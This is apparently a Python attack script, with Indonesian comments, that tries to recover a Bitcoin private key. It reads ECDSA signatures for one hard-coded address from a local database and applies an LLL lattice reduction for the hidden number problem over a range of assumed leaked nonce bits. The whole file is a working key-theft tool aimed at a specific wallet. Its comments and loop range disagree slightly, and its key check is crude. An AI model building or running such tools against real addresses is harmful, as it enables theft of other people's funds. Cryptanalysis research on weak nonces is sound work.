import sqlite3
import sys
import subprocess
import os
from fastecdsa.curve import secp256k1
from sympy import mod_inverse

# Coba paksa Python mencari di lokasi site-packages user
import site
user_site = site.getusersitepackages()
if user_site not in sys.path:
    sys.path.append(user_site)

try:
    from fpylll import IntegerMatrix, LLL
    HAS_FPYLLL = True
except ImportError:
    try:
        # Percobaan terakhir: cari lokasi via pip show
        location = subprocess.check_output([sys.executable, "-m", "pip", "show", "fpylll"]).decode()
        for line in location.split('\n'):
            if line.startswith('Location: '):
                sys.path.append(line.split(': ')[1])
        from fpylll import IntegerMatrix, LLL
        HAS_FPYLLL = True
    except:
        HAS_FPYLLL = False

def get_data_for_address(db_path, target_address):
    if not os.path.exists(db_path):
        print(f"❌ File {db_path} tidak ditemukan!")
        return []
    
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    # Mengambil r, s, z dan msb_leak jika ada
    cursor.execute("SELECT r, s, z FROM signatures WHERE address = ?", (target_address,))
    rows = cursor.fetchall()
    conn.close()
    
    data = []
    for r_h, s_h, z_h in rows:
        try:
            r = int(str(r_h), 16) if 'x' in str(r_h) else int(r_h)
            s = int(str(s_h), 16) if 'x' in str(s_h) else int(s_h)
            z = int(str(z_h), 16) if 'x' in str(z_h) else int(z_h)
            data.append({'r': r, 's': s, 'z': z})
        except: continue
    return data

def solve_hnp(data, leaked_bits):
    if not HAS_FPYLLL:
        print("❌ Error: fpylll tetap tidak bisa dimuat.")
        return None

    q = secp256k1.q
    n = len(data)
    B = 2**(256 - leaked_bits)
    
    matrix = IntegerMatrix(n + 2, n + 2)
    
    for i in range(n):
        s_inv = mod_inverse(data[i]['s'], q)
        t = (data[i]['r'] * s_inv) % q
        u = (data[i]['z'] * s_inv) % q
        matrix[i, i] = q
        matrix[n, i] = t
        matrix[n + 1, i] = u
    
    matrix[n, n] = 1
    matrix[n + 1, n + 1] = B 

    print(f"⚙️  Running LLL pada {n} signatures...")
    LLL.reduction(matrix)
    
    for i in range(matrix.nrows):
        potential_d = abs(matrix[i, n])
        if potential_d > 10**20: # Private key Bitcoin adalah angka yang sangat besar
            # Validasi sederhana: d < q
            if potential_d < q:
                return hex(potential_d)
    return None

if __name__ == "__main__":
    DB_NAME = 'valid_nonce_reuse.db'
    TARGET = '1EpEs838TdcuoqrGd6kqNp4pDJMwG1FqrZ'
    
    print(f"--- Lattice HNP Attack Tool ---")
    print(f"Python: {sys.executable}")
    
    if not HAS_FPYLLL:
        print("❌ FPYLLL tidak terdeteksi di library path.")
        print(f"Saran: Jalankan 'PYTHONPATH=. python3 ll.py' atau install ulang dengan '--user'")
    else:
        sigs = get_data_for_address(DB_NAME, TARGET)
        if sigs:
            # Mencoba range bits 8 sampai 16
            for b in range(12, 7, -1): 
                res = solve_hnp(sigs, b)
                if res:
                    print(f"🎯 SUCCESS! Private Key ditemukan ({b} bits): {res}")
                    break
            else:
                print("❌ Gagal menemukan kunci. Mungkin bit yang bocor bukan MSB atau data kurang.")
        else:
            print("❌ Data address tidak ditemukan di database.")
